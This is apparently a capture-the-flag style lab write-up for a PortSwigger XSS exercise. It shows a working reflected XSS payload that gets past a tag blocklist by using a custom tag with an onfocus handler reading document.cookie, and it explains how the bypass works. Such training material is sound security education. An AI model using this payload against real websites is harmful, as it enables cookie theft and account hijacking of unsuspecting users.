### Reflected XSS into HTML context with all tags blocked except custom ones

```
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
``` 

    
Click "Store" and "Deliver exploit to victim".

This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the ```alert``` function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called.
